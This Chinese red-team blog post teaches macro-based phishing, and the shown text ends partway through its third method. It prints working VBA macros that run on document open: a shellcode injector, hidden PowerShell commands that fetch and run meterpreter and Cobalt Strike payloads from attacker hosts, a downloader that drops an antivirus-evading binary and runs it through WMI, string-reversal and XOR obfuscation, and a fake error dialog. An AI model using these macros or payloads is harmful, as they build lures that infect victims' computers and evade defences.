<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="cn">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222">






  
  
    
      
    
    
      
    
  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



















  
  
  
  

  
    
    
  

  
    
      
    

    
  

  

  
    
      
    

    
  

  
    
      
    

    
  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






  

<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '6.4.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="卑由骨里生 万般不如人  聊一聊宏钓鱼">
<meta name="keywords" content="钓鱼,macro">
<meta property="og:type" content="article">
<meta property="og:title" content="聊聊宏钓鱼">
<meta property="og:url" content="https://lengjibo.github.io/fishing/index.html">
<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
<meta property="og:description" content="卑由骨里生 万般不如人  聊一聊宏钓鱼">
<meta property="og:locale" content="cn">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/0.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/1.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/2.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/3.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/4.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/5.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/6.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/7.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/8.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/9.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/10.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/11.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/12.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/13.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/14.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/15.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/16.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/17.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/18.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/19.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/20.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/21.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/22.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/23.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/24.png">
<meta property="og:image" content="https://lengjibo.github.io/images/fishing/25.png">
<meta property="og:updated_time" content="2020-11-07T14:41:26.520Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="聊聊宏钓鱼">
<meta name="twitter:description" content="卑由骨里生 万般不如人  聊一聊宏钓鱼">
<meta name="twitter:image" content="https://lengjibo.github.io/images/fishing/0.png">



  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />




  <link rel="canonical" href="https://lengjibo.github.io/fishing/"/>



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>聊聊宏钓鱼 | 冷逸的个人博客|开往安河桥北~</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="cn">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Beranda</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Tentang</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategori</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Arsip</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-book">
    <a href="/book/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/fishing/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="冷逸">
      <meta itemprop="description" content="做一个温柔的人...">
      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">聊聊宏钓鱼
              
            
          </h1>
        

        <div class="post-meta">
        
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Diposting di</span>
              

              
                
              

              <time title="Post created: 2020-11-07 22:18:42 / Updated at: 22:41:26" itemprop="dateCreated datePublished" datetime="2020-11-07T22:18:42+08:00">2020-11-07</time>
            

            
              

              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">Di</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon"
            >
            <i class="fa fa-eye"></i>
             Views:  
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>卑由骨里生 万般不如人</p>
<hr>
<p>聊一聊宏钓鱼</p>
<a id="more"></a>
<h2 id="调用powershell"><a href="#调用powershell" class="headerlink" title="调用powershell"></a>调用powershell</h2><p>本文将简单介绍使用宏代码进行钓鱼的方法，并使其可以回连到CobaltStrike. CobaltStrike.自带有宏钓鱼功能。可以使用如下步骤进行创建：</p>
<blockquote>
<p>Attacks –&gt; Packages –&gt; MS offices Macro</p>
</blockquote>
<p><img src="../images/fishing/0.png" alt="image.png"></p>
<p>内容大体如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(shellcode)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
<p>那么下面，我们使用一个其他的方法来制作一个简单的钓鱼文档，首先新建一个word文档，然后转到宏编辑页面</p>
<p><img src="../images/fishing/1.png" alt="image.png"></p>
<p>随意输入一个名字，来到vb编辑页面</p>
<p><img src="../images/fishing/2.png" alt="image.png"></p>
<p>本例采用powershell上线的方法，进行宏攻击，我们可以参考已经公开的代码<a href="https://github.com/enigma0x3/Powershell-Payload-Excel-Delivery/blob/master/MacroCode，来编写我们的宏代码" target="_blank" rel="noopener">https://github.com/enigma0x3/Powershell-Payload-Excel-Delivery/blob/master/MacroCode，来编写我们的宏代码</a></p>
<p>然后进行删减，得到如下宏代码，其实也只是删除了其中的计划任务部分而已。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Sub Auto_Open()</span><br><span class="line"></span><br><span class="line">Execute</span><br><span class="line">Persist</span><br><span class="line"></span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     Public Function Execute() As Variant</span><br><span class="line">        Const HIDDEN_WINDOW = 0</span><br><span class="line">        strComputer = &quot;.&quot;</span><br><span class="line">        Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;)</span><br><span class="line">         </span><br><span class="line">        Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)</span><br><span class="line">        Set objConfig = objStartup.SpawnInstance_</span><br><span class="line">        objConfig.ShowWindow = HIDDEN_WINDOW</span><br><span class="line">        Set objProcess = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2:Win32_Process&quot;)</span><br><span class="line">        objProcess.Create &quot;powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString(&apos;http://192.168.1.127/Invoke-Shellcode&apos;)); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force&quot;, Null, objConfig, intProcessID</span><br><span class="line">     End Function</span><br></pre></td></tr></table></figure>
<p>因为他的宏，默认是ps是调用的invoke-shellcoded，也就是下面的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString(&apos;http://192.168.1.127/Invoke-Shellcode&apos;)); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force</span><br></pre></td></tr></table></figure>
<p>而我们的cs就不用这么麻烦，直接ps上线即可，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.2.114:8011/a&apos;))&quot;</span><br></pre></td></tr></table></figure>
<p>替换至对应地方，放入编辑器，执行，获取session</p>
<p><img src="../images/fishing/3.png" alt="image.png"></p>
<p>为了考虑其真实性，可以增加弹框，来增加其真实性，比如下面这种</p>
<p><img src="../images/fishing/4.png" alt="image.png"></p>
<p>其代码也是很简单，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Result = MsgBox(&quot;The document cannot be decrypted.&quot;, vbAbortRetryIgnore + vbCritical, &quot;Please contact 360.&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="远程下载二进制并执行"><a href="#远程下载二进制并执行" class="headerlink" title="远程下载二进制并执行"></a>远程下载二进制并执行</h2><p>本次将介绍一种下载二进制文件，并执行的方法来获得一个cobaltstrike的会话方法。首先我们先制作一个简单的cs免杀木马。这里使用的是AppLaunch.exe这个程序，该文件为.net自带的程序，并具有微软签名。</p>
<p><img src="../images/fishing/5.png" alt="image.png"></p>
<p>然后这里只是简单制作一下免杀，所以选用shellter来进行免杀，注意shellter只支持32位程序，且会破坏原有的数字签名。</p>
<p>然后使用cs生成raw的载荷，使用shellter进行免杀操作：</p>
<p><img src="../images/fishing/6.png" alt="image.png"></p>
<p>然后我们来看一下免杀效果，二进制文件查杀率：</p>
<p><img src="../images/fishing/7.png" alt="image.png"></p>
<p>360全家桶暂无反映</p>
<p><img src="../images/fishing/8.png" alt="image.png"></p>
<p>那么免杀二进制文件制作完成了，下面我们来编写我们的宏代码。先来编写我们的下载功能，这个还是比较简单的，直接调用WinHttp.WinHttpRequest.5.1即可，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Dim payload As String</span><br><span class="line">Dim namePrefix As String</span><br><span class="line">Dim nameSuffix As String</span><br><span class="line">Dim zzz As String</span><br><span class="line">Dim dollop As Object</span><br><span class="line">Dim dstPath As String</span><br><span class="line">Dim savePath As String</span><br><span class="line"></span><br><span class="line">namePrefix = &quot;AppLaunch-actual&quot;</span><br><span class="line">nameSuffix = &quot;.exe&quot;</span><br><span class="line">payload = &quot;http://192.168.41.4/AppLaunch.exe&quot;</span><br><span class="line"></span><br><span class="line">zzz = payload</span><br><span class="line"></span><br><span class="line">Dim downloadf</span><br><span class="line">Set downloadf = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;)</span><br><span class="line">downloadf.Open &quot;GET&quot;, zzz, False</span><br><span class="line">downloadf.setRequestHeader &quot;Host&quot;, &quot;192.168.41.4&quot;</span><br><span class="line">downloadf.Send</span><br><span class="line">Set dollop = CreateObject(StrReverse(&quot;maertS.bdodA&quot;))</span><br><span class="line">dollop.Type = 1</span><br><span class="line">dollop.Open</span><br><span class="line">dollop.Write downloadf.responseBody</span><br><span class="line">dstPath = Environ$(&quot;TEMP&quot;) &amp; &quot;\&quot; &amp; namePrefix &amp; nameSuffix</span><br><span class="line">savePath = dstPath</span><br><span class="line">dollop.savetofile savePath, 2</span><br></pre></td></tr></table></figure>
<p>成功下载</p>
<p><img src="../images/fishing/9.png" alt="image.png"></p>
<p>注意这里使用的是环境变量来获取temp的位置并保存的，不同主机temp位置可能不同，可以使用set命令来查看。下载完成后，继续使用wmi来执行我们的二进制程序，不过与昨天的wmi方式稍微有些不同是使用的2vmic\toor.\:stmgmniw，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Const HIDDEN_WINDOW = 0</span><br><span class="line"></span><br><span class="line"> strComputer = &quot;.&quot;</span><br><span class="line"> binary = dstPath</span><br><span class="line"> strGetObject = StrReverse(&quot;2vmic\toor\.\\:stmgmniw&quot;)</span><br><span class="line"> Set objWMIService = GetObject(strGetObject)</span><br><span class="line"> Set objStartup = objWMIService.Get(StrReverse(&quot;putratSssecorP_23niW&quot;))</span><br><span class="line"> Set objConfig = objStartup.SpawnInstance_</span><br><span class="line"> objConfig.ShowWindow = HIDDEN_WINDOW</span><br><span class="line"> Set objProcess = GetObject(strGetObject &amp; StrReverse(&quot;ssecorP_23niW:&quot;))</span><br><span class="line"> objProcess.Create binary, Null, objConfig, intProcessID</span><br></pre></td></tr></table></figure>
<p><img src="../images/fishing/10.png" alt="image.png"></p>
<p>程序成功运行。</p>
<p>简单一扫</p>
<p><img src="../images/fishing/11.png" alt="image.png"></p>
<h2 id="利用环境变量解密加载"><a href="#利用环境变量解密加载" class="headerlink" title="利用环境变量解密加载"></a>利用环境变量解密加载</h2><p>这个思路是在国外一个网站上看到的，原文在这<a href="https://0xdf.gitlab.io/2018/07/31/malware-analysis-muddoc.html，在此感谢作者给出的思路，这里简单来给大家看下总体思路：" target="_blank" rel="noopener">https://0xdf.gitlab.io/2018/07/31/malware-analysis-muddoc.html，在此感谢作者给出的思路，这里简单来给大家看下总体思路：</a></p>
<p><img src="../images/fishing/12.png" alt="image.png"></p>
<p>大体思路就是使用环境变量去xor解密远程url地址，然后落地化dll，调用rundll32去运行dll，得到sessIon。</p>
<p>我们先来看一下用了xor加密的函数(<a href="http://www.vbaexpress.com/kb/getarticle.php?kb_id=951)：" target="_blank" rel="noopener">http://www.vbaexpress.com/kb/getarticle.php?kb_id=951)：</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Function XorC(ByVal sData As String, ByVal sKey As String) As String</span><br><span class="line">Dim l As Long, i As Long, byIn() As Byte, byOut() As Byte, byKey() As Byte</span><br><span class="line">Dim bEncOrDec As Boolean</span><br><span class="line"></span><br><span class="line">If Len(sData) = 0 Or Len(sKey) = 0 Then XorC = &quot;Invalid argument(s) used&quot;: Exit Function</span><br><span class="line"></span><br><span class="line">If Left$(sData, 3) = &quot;xxx&quot; Then</span><br><span class="line">bEncOrDec = False</span><br><span class="line">sData = Mid$(sData, 4)</span><br><span class="line">Else</span><br><span class="line">bEncOrDec = True</span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">byIn = sData</span><br><span class="line">byOut = sData</span><br><span class="line">byKey = sKey</span><br><span class="line">l = LBound(byKey)</span><br><span class="line">For i = LBound(byIn) To UBound(byIn) - 1 Step 2</span><br><span class="line">byOut(i) = ((byIn(i) + Not bEncOrDec) Xor byKey(l)) - bEncOrDec</span><br><span class="line">l = l + 2</span><br><span class="line">If l &gt; UBound(byKey) Then l = LBound(byKey)</span><br><span class="line">Next i</span><br><span class="line">XorC = byOut</span><br><span class="line">If bEncOrDec Then XorC = &quot;xxx&quot; &amp; XorC</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>
<p>该函数接收两个参数，一个字符串、一个key。而为了安全起见，我们的key不直接写入到宏中，我们这里选择使用环境变量来获取key，机器上的环境变量可以使用set命令来查看：</p>
<p><img src="../images/fishing/13.png" alt="image.png"></p>
<p>我们在选择key是，要注意目标环境的变量，每个机器变量可能都不尽相同，不过有一些变量是相同的，我这里选择的是PROCESSOR_REVISION，值为9e0a，那么这里我们就要用到一个样本了，样本已上传到github(<a href="https://github.com/lengjibo/RedTeamTools/blob/master/windows/macros/encryptor.xls)，该宏可用于加密我们的url地址：" target="_blank" rel="noopener">https://github.com/lengjibo/RedTeamTools/blob/master/windows/macros/encryptor.xls)，该宏可用于加密我们的url地址：</a></p>
<p><img src="../images/fishing/14.png" alt="image.png"></p>
<p>得到一个base64的字符串，然后解密</p>
<p><img src="../images/fishing/15.png" alt="image.png"></p>
<p>然后用我们的xor解密函数，key使用Environ来获取，来进行解密：</p>
<p><img src="../images/fishing/16.png" alt="image.png"></p>
<p><img src="../images/fishing/17.png" alt="image.png"></p>
<p>解密出来的稍微有些问题，这里需要主要环境变量的大小写问题，然后，我们使用下载函数，下载我们的dll，也就是之前的代码：</p>
